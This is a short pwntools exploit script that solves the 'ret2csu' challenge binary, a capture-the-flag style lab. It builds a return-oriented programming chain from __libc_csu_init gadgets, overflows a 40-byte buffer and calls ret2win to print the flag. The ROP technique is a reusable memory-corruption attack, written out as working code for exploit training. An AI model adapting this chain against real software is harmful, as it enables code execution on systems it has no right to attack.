from pwn import *

elf = context.binary = ELF('./ret2csu', checksec=False)
p = process()

rop = ROP(elf)

params = [0xdeadbeefdeadbeef,   # rdi
          0xcafebabecafebabe,   # rsi
          0xd00df00dd00df00d]   # rdx

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a
csu_mov = 0x400680 # mov rdx, r15; mov rsi, r14; mov edi, r13, call QWORD PTR [r12+rbx*8]; ret

# Note this doesn't work
# rop.call("ret2win", params)

rop.raw([
    pop_rbx_rbp_r12_r13_r14_r15,
    0x0,
    0x1,
    0x600e48,   # Point to .fini
    params,     # params for ret2win
    csu_mov,    # Move from r13-r15 to rdx, rsi, rdi
    p64(0) * 7, # Padding for the subsequent pops
    pop_rdi,
    params[0],  # Put deadbeef back in RDI (we only got 32-bit address in there earlier)
    elf.symbols.ret2win,  # Pwn
])

rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Create payload
payload = flat(
    {40: rop_chain}
)

p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

flag = p.recv()
success(flag)